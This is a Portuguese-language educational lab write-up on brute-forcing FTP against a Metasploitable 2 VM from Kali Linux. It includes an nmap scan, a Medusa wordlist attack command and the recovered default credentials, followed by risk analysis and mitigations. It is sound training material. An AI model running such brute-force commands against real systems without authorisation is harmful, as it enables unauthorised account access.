# 🔐 Laboratório de Ataques de Força Bruta com Kali Linux e Medusa

## 📌 Objetivo

Simular ataques de força bruta em ambiente controlado utilizando Kali Linux contra Metasploitable 2, aplicando técnicas de enumeração, exploração e análise de mitigação.

---

## 🖥️ Ambiente Utilizado

- VirtualBox
- Kali Linux (Máquina Atacante)
- Metasploitable 2 (Máquina Vulnerável)
- Rede Host-Only

---

## 🔎 Enumeração

Foi realizada enumeração inicial utilizando Nmap:

nmap -sV 192.168.56.102

### Serviços Identificados:

- FTP (21) – vsftpd 2.3.4
- HTTP (80) – Apache 2.2.8
- SMB (139, 445) – Samba 3.x
- Outros serviços legados (Telnet, Rlogin, MySQL, PostgreSQL)

---

## ⚔️ Ataque 1 – Força Bruta em FTP

Ferramenta utilizada: Medusa

Comando:

medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp

### Resultado:

Credenciais encontradas:
Usuário: msfadmin  
Senha: msfadmin  

Validação realizada via login manual no serviço FTP.

---

## 🛡️ Análise de Risco

O servidor permite múltiplas tentativas de autenticação sem bloqueio, facilitando ataques de força bruta.  
A senha encontrada é fraca e previsível, demonstrando ausência de política de segurança adequada.

---

## 🔐 Medidas de Mitigação

- Implementação de política de senha forte
- Bloqueio de conta após tentativas falhas
- Monitoramento de logs
- Implementação de Fail2Ban
- Substituição de FTP por SFTP

---

## 📚 Conclusão

O laboratório demonstrou como serviços mal configurados e credenciais fracas podem comprometer um sistema.  
A prática reforça a importância de controles preventivos contra ataques automatizados.

---

⚠️ Todos os testes foram realizados em ambiente controlado para fins educacionais.
